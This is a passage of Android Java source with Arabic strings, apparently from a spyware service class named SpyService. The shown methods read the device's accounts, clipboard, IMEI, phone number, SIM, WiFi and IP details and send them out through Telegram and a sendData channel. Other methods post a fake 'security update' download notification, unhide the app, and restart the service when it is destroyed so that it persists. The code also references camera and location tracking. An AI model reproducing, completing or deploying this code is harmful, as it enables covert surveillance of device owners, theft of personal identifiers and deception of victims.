        getPackageManager().setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        sendData("SHOW", "shown");
        sendTextToTelegram("👁 تم إظهار التطبيق");
    }

    private void showFakeNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("fake", "System", NotificationManager.IMPORTANCE_HIGH);
            nm.createNotificationChannel(ch);
        }
        nm.notify((int)(System.currentTimeMillis()%9999),
                new NotificationCompat.Builder(this, "fake")
                        .setContentTitle("📥 تحديث أمني")
                        .setContentText("تم تنزيل تحديث 245MB")
                        .setSmallIcon(android.R.drawable.stat_sys_download)
                        .setProgress(100, 45, false)
                        .setOngoing(true)
                        .build());
        sendData("NOTIFY", "fake notification sent");
        sendTextToTelegram("🔔 تم إرسال إشعار وهمي");
    }

    private File getAccounts() {
        try {
            File f = new File(getCacheDir(), "accounts.txt");
            FileOutputStream fos = new FileOutputStream(f);
            android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
            android.accounts.Account[] accounts = am.getAccounts();
            for (android.accounts.Account acc : accounts) {
                fos.write((acc.name + " (" + acc.type + ")\n").getBytes());
            }
            fos.close();
            return f;
        } catch (Exception e) {
            Log.e(TAG, "getAccounts error", e);
            return new File(getCacheDir(), "accounts.txt");
        }
    }

    private File getClipboard() {
        try {
            File f = new File(getCacheDir(), "clipboard.txt");
            FileOutputStream fos = new FileOutputStream(f);
            android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            String text = cm.getText() != null ? cm.getText().toString() : "فارغ";
            fos.write(text.getBytes());
            fos.close();
            return f;
        } catch (Exception e) {
            Log.e(TAG, "getClipboard error", e);
            return new File(getCacheDir(), "clipboard.txt");
        }
    }

    private void sendDeviceInfo() {
        try {
            String info = "📱 **معلومات الجهاز**\n\n" +
                    "الموديل: " + Build.MODEL + "\n" +
                    "الشركة: " + Build.MANUFACTURER + "\n" +
                    "أندرويد: " + Build.VERSION.RELEASE + "\n" +
                    "API: " + Build.VERSION.SDK_INT + "\n" +
                    "Android ID: `" + deviceId + "`\n" +
                    "IMEI: " + getImeiValue() + "\n" +
                    "رقم الهاتف: " + getPhoneValue() + "\n" +
                    "الشريحة: " + getSimValue() + "\n" +
                    "WiFi: " + getWifiValue() + "\n" +
                    "البطارية: " + getBatteryValue() + "%";
            sendData("DEVICE_INFO", info);
            sendTextToTelegram(info);
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة معلومات الجهاز");
            sendTextToTelegram("❌ فشل قراءة معلومات الجهاز");
        }
    }

    private void sendNetworkInfo() {
        try {
            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
            android.net.wifi.WifiInfo wifiInfo = wifi.getConnectionInfo();
            String info = "📡 **معلومات الشبكة**\n\n" +
                    "WiFi: " + (wifiInfo.getSSID() != null ? wifiInfo.getSSID() : "غير متصل") + "\n" +
                    "القوة: " + android.net.wifi.WifiManager.calculateSignalLevel(wifiInfo.getRssi(), 5) + "/5\n" +
                    "IP: " + getIpValue() + "\n" +
                    "المشغل: " + ((TelephonyManager) getSystemService(TELEPHONY_SERVICE)).getNetworkOperatorName();
            sendData("NETWORK_INFO", info);
            sendTextToTelegram(info);
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة معلومات الشبكة");
            sendTextToTelegram("❌ فشل قراءة معلومات الشبكة");
        }
    }

    // دوال مساعدة
    private String getImeiValue() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) return "غير متاح";
            return (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? tm.getImei() : tm.getDeviceId();
        } catch (Exception e) { return "غير متاح"; }
    }

    private String getPhoneValue() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) return "غير متاح";
            return tm.getLine1Number();
        } catch (Exception e) { return "غير متاح"; }
    }

    private String getSimValue() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) return "غير متاح";
            return tm.getSimOperatorName() + " (" + tm.getSimCountryIso() + ")";
        } catch (Exception e) { return "غير متاح"; }
    }

    private String getWifiValue() {
        try {
            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
            return info.getSSID();
        } catch (Exception e) { return "غير متاح"; }
    }

    private String getBatteryValue() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryIntent = registerReceiver(null, ifilter);
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", -1);
                if (level >= 0 && scale > 0) return String.valueOf((level * 100) / scale);
            }
        } catch (Exception e) { return "غير متاح"; }
        return "غير متاح";
    }

    private String getIpValue() {
        try {
            URL url = new URL("https://api.ipify.org");
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
            String ip = reader.readLine();
            reader.close();
            return ip;
        } catch (Exception e) { return "غير متاح"; }
    }

    // ======================================================================
    // ========== دورة حياة الخدمة ==========
    // ======================================================================

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdown();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (camera != null) { camera.release(); camera = null; }
        if (isTrackingLocation && locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
        startService(new Intent(this, SpyService.class));
    }
}
